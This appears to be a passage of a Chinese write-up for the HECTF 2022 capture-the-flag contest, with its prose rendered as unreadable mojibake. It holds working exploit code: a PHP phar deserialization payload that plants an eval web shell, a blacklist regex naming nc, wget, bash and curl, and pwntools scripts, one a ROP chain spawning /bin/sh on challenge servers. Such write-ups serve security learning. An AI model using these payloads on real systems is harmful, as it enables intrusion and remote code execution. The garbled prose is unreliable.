bGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==</code></p>
<p>å°†docxä¸­çš„å­—ç¬¦ä¸²base64åå’Œ0å®½å¾—åˆ°çš„å­—ç¬¦æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œç„¶åè¿›è¡Œè¯é¢‘åˆ†æï¼Œå¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022hectf-2.png"></p>
<h2 id="æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£"><a href="#æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£" class="headerlink" title="æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£"></a>æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£</h2><p>å›¾ç‰‡è¡¥ä¸Š<code>89 50 4E 47</code>ï¼Œå†…å®¹æ˜¯zip</p>
<p>ocråå¦å­˜ä¸ºï¼Œæ•°å­—æš´åŠ›ç ´è§£å¾—åˆ°<code>8686</code></p>
<p>è§£å‹å¾—åˆ°<code>â€–â™¬â™©â€–Â¶â™¯â€–â™¬â™­â€–â™¬â™«â€–â™«â™ªâ€–â™«Â§â€–â€–â€–â€–â™©Â¶â™­â™­â™­â€–â™¬â™©â€–â™¬Â¶â€–â€–â€–â€–â™¬âˆ®â™­â™­â™­â€–Â¶Â§â€–â€–â™¯â™­â™­â™­â€–â™¬â™©â€–â€–â™­â€–â™¬â™­â€–â™¬â™«â€–â™«â™«Â§=</code></p>
<p>åƒåƒç§€å­—çš„åœ¨çº¿éŸ³ç¬¦è§£å¯†å¾—åˆ°<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code></p>
<h2 id="æ¥ç©æ‰è¿·è—å‘€"><a href="#æ¥ç©æ‰è¿·è—å‘€" class="headerlink" title="æ¥ç©æ‰è¿·è—å‘€"></a>æ¥ç©æ‰è¿·è—å‘€</h2><p>lsbå¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²<br><code>63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........</code></p>
<p>å°†å­—èŠ‚å¼‚æˆ–51åå‘ç°æ°å¥½æ˜¯<code>50 4b.....</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br>d=f.read()<br>d=d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">51</span>)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e)<br>f.close()<br></code></pre></td></tr></table></figure>

<p>è§£å‹åå¾—åˆ°ä¸€ä¸ªdocx</p>
<p>å°†å­—ä½“å˜æˆé»‘è‰²å¾—åˆ°flag</p>
<h2 id="2022HECTFè°ƒæŸ¥é—®å·"><a href="#2022HECTFè°ƒæŸ¥é—®å·" class="headerlink" title="2022HECTFè°ƒæŸ¥é—®å·"></a>2022HECTFè°ƒæŸ¥é—®å·</h2><p>é—®å·</p>
<h2 id="æ²¡å¤§æ²¡å°çš„é¼“åŠ±"><a href="#æ²¡å¤§æ²¡å°çš„é¼“åŠ±" class="headerlink" title="æ²¡å¤§æ²¡å°çš„é¼“åŠ±"></a>æ²¡å¤§æ²¡å°çš„é¼“åŠ±</h2><p><em>èµ›åå¤ç°</em></p>
<p>æ ¹æ®hintå¾—çŸ¥å¯†ç æ˜¯<code>wocenimenma</code></p>
<p>è¿›è¡Œå¤§å°å†™çˆ†ç ´</p>
<p><img src="/img/wp/2022/2022hectf-3.png"></p>
<p>sstvå¾—åˆ°<code>YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=</code></p>
<p><img src="/img/wp/2022/2022hectf-4.png"></p>
<p>base64å¾—åˆ°<code>b8d55688410af102549de756eb3da854</code></p>
<p>md5å¾—åˆ°<code>litangdj</code></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="è¿·è·¯çš„å°ç‹®"><a href="#è¿·è·¯çš„å°ç‹®" class="headerlink" title="è¿·è·¯çš„å°ç‹®"></a>è¿·è·¯çš„å°ç‹®</h2><p>1ï¼šhebnu is a good site.</p>
<p>ä¼ å…¥<code>http://121.4.119.164:32063/hebnu</code></p>
<p>2: Can you use another way of requestingï¼Ÿ</p>
<p>postä¼ å…¥<code>hebnu</code></p>
<p>3: æ¥è‡ªå®˜ç½‘çš„ä½ ï½ã€‚ï½</p>
<p>æ·»åŠ <code>Referer: https://www.hebtu.edu.cn</code></p>
<p>4ï¼šCan you come to my house to see me?</p>
<p>æ·»åŠ <code>X-Forwarded-For: 127.0.0.1</code></p>
<p>5ï¼šInternet Explorer is the best browserï¼</p>
<p>æ·»åŠ <code>User-Agent: Internet Explorer</code></p>
<p>æœ€ååœ¨è¿”å›åŒ…çš„å¤´ä¸­å¾—åˆ°ä¸€ä¸²jsï¼Œåœ¨æ§åˆ¶å°è¾“å…¥å¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022hectf-5.png"></p>
<h2 id="æ“å¤©æ³¨"><a href="#æ“å¤©æ³¨" class="headerlink" title="æ“å¤©æ³¨"></a>æ“å¤©æ³¨</h2><p>sqlmapä¸€æŠŠæ¢­</p>
<p><img src="/img/wp/2022/2022hectf-6.png"></p>
<h2 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h2><p>å¯¹showå‚æ•°ç”¨ä¼ªåè®®è¯»æ–‡ä»¶</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FROM_INDEX&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]) ? <span class="hljs-string">&#x27;home&#x27;</span> : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\./&#x27;</span>, <span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/zip/i&#x27;</span>,<span class="hljs-variable">$show</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not this !!!&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&#x27;ob_gzhandler&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page_tshow</span>(<span class="hljs-params"><span class="hljs-variable">$show</span></span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>	&lt;div id=<span class="hljs-string">&quot;header&quot;</span>&gt;<br>		&lt;center&gt;&lt;a href=<span class="hljs-string">&quot;?show=home&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">logo</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">images</span>/<span class="hljs-title">logo</span>.<span class="hljs-title">jpg</span>&quot; <span class="hljs-title">alt</span>=&quot;&quot;&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">	&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">	&lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">body</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">fatal</span>($<span class="hljs-title">msg</span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">article</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Error</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">p</span>&gt;&lt;?=$<span class="hljs-title">msg</span>;?&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">exit</span>(1);</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">page_tshow</span>($<span class="hljs-title">show</span>);</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(!(<span class="hljs-title">include</span> $<span class="hljs-title">show</span> . &#x27;.<span class="hljs-title">php</span>&#x27;))</span><br><span class="hljs-class">    <span class="hljs-title">fatal</span>(&#x27;<span class="hljs-title">no</span> <span class="hljs-title">no</span> <span class="hljs-title">no</span>&#x27;);</span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;	surely exists&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;	dont exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ„é€ png</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;cmd.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-comment">// exec($this-&gt;cmd);</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;awsl.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">HeCTF</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>,<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ ç”Ÿæˆçš„<code>ez.png</code>ï¼Œè§¦å‘payload</p>
<p><img src="/img/wp/2022/2022hectf-7.png"></p>
<p>è®¿é—®ç”Ÿæˆçš„<code>cmd.php</code>ï¼ŒæˆåŠŸrce</p>
<p><img src="/img/wp/2022/2022hectf-8.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="æµåŠ¨çš„éŸ³ç¬¦"><a href="#æµåŠ¨çš„éŸ³ç¬¦" class="headerlink" title="æµåŠ¨çš„éŸ³ç¬¦"></a>æµåŠ¨çš„éŸ³ç¬¦</h2><p>åœ¨çº¿éŸ³ç¬¦è§£å¯†å¾—åˆ°<code>EA&gt;N?s:WZgTdPYbMSaYg</code></p>
<p>å°†å­—ç¬¦ä¸²çš„å¼€å¤´ä¸HECTFæ¯”è¾ƒåä¸éš¾å‘ç°ï¼Œåé¢å­—ç¬¦æ˜¯æŒ‰ç…§+3ï¼Œ+4ï¼Œ+5ã€‚ã€‚ã€‚çš„è§„å¾‹</p>
<p><img src="/img/wp/2022/2022hectf-9.png"></p>
<h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>é¢˜ç›®æ²¡å‡ºå¥½ï¼Œflagç›´æ¥æ˜¯æ˜æ–‡çš„æ”¾åœ¨æ–‡ä»¶ä¸­</p>
<h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>å…ˆå°æŒ‡æ•°çˆ†ç ´ï¼Œå¾—åˆ°<code>p</code>å’Œ<code>q</code>ï¼Œé€šè¿‡<code>n/q/p</code>å¾—åˆ°<code>t</code>ã€‚é€šè¿‡æ¨¡ä¸äº’ç´ å¾—åˆ°<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boom</span>(<span class="hljs-params">c_,n_,e_</span>):<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span>  gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">0</span>]<br>        i=i+<span class="hljs-number">1</span><br><br>p_= <span class="hljs-number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span><br>q_= <span class="hljs-number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span><br>c= <span class="hljs-number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span><br>n= <span class="hljs-number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span><br>p=boom(p_,n,<span class="hljs-number">2</span>)<br>q=boom(q_,n,<span class="hljs-number">2</span>)<br>t=n//p//q<br><span class="hljs-keyword">if</span> (t*p*q!=n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    exit(<span class="hljs-number">0</span>)<br>e =<span class="hljs-number">114</span><br><br><br>phi_n= (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><br>t=gmpy2.gcd(e,phi_n)<br>e=e//t<br>d=gmpy2.invert(e,phi_n)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>ä¼ å…¥<code>\x00</code>ç»•è¿‡åˆ¤æ–­</p>
<p><img src="/img/wp/2022/2022hectf-10.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;49.234.8.239&#x27;</span>,<span class="hljs-string">&#x27;30531&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<p>è¾“å…¥<code>:!/bin/sh</code>ï¼Œä½¿å¾—vimä¸­å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p><img src="/img/wp/2022/2022hectf-11.png"></p>
<h2 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h2><p>ä¼ å…¥ä¸€ä¸ª<code>0xFFFFF82</code>å³å¯</p>
<p><img src="/img/wp/2022/2022hectf-12.png"></p>
<p><img src="/img/wp/2022/2022hectf-13.png"></p>
<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>æ ˆæº¢å‡ºæ„é€ <code>rep</code>é“¾ï¼Œæ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;)</code></p>
<p><img src="/img/wp/2022/2022hectf-14.png"></p>
<p><img src="/img/wp/2022/2022hectf-15.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>rdi=<span class="hljs-number">0x00000000004018b2</span><br>rsi=<span class="hljs-number">0x000000000040661e</span><br>rdx=<span class="hljs-number">0x00000000004017bf</span><br>ret=<span class="hljs-number">0x000000000040f408</span><br>syscall=<span class="hljs-number">0x00000000004012e3</span><br>rax=<span class="hljs-number">0x0000000000451aa7</span><br>read=<span class="hljs-number">0x450ff0</span><br><br><span class="hljs-comment">#p=remote()</span><br><span class="hljs-comment">#p=process(&#x27;./static&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401e3c&#x27;)</span><br><span class="hljs-comment">#pause()</span><br>p=remote(<span class="hljs-string">&#x27;121.4.119.164&#x27;</span>,<span class="hljs-string">&#x27;32430&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./static&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x29</span>)<br>payload=flat(<br>        rdi,<span class="hljs-number">0</span>,<br>        rsi,e.bss(<span class="hljs-number">0x100</span>),<br>        rdx,<span class="hljs-number">0x20</span>,<br>        read,<br>        rdi,e.bss(<span class="hljs-number">0x100</span>),<br>        rsi,<span class="hljs-number">0</span>,<br>        rdx,<span class="hljs-number">0</span>,<br>        ret,<br>        rax,<span class="hljs-number">0x3b</span>,<br>        syscall);<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>+payload)<br><br>p.interactive()<br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2022/2022hectf-16.png"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><p><em>èµ›åå¤ç°</em></p>
<p><img src="/img/wp/2022/2022hectf-17.png"></p>
<h2 id="è´æ–¯"><a href="#è´æ–¯" class="headerlink" title="è´æ–¯"></a>è´æ–¯</h2><p>è¾“å…¥çš„æ•°æ®ç»è¿‡æŸç§åŠ å¯†åå¯¹æ¯ä¸ªå­—èŠ‚å–åï¼Œç„¶åä¸<code>P0w3r</code>çš„å†…å®¹æ¯”è¾ƒ<br>åœ¨<code>Enc0de</code>ä¸­çœ‹å­—ç¬¦é›†å‘ç°æ˜¯base32åŠ å¯†</p>
<p><img src="/img/wp/2022/2022hectf-18.png"></p>
<p>å°†<code>P0w3r</code>å˜é‡çš„å†…å®¹æå–å‡ºæ¥åå¼‚æˆ–<code>0xff</code>ï¼Œbase32è§£ç å³å¯</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAF</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xB3</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xB4</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xA7</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xBB</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xAE</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0xff</span>)<br>e+=<span class="hljs-string">&#x27;====&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b32decode(e))<br></code></pre></td></tr></table></figure>




<h2 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h2><p>ä¸€ä¸ªç®€å•çš„æ¯”è¾ƒï¼Œå¼‚æˆ–<code>0x1F</code>ç„¶ååŠ 1</p>
<p><img src="/img/wp/2022/2022hectf-19.png"></p>
<p>exp</p>
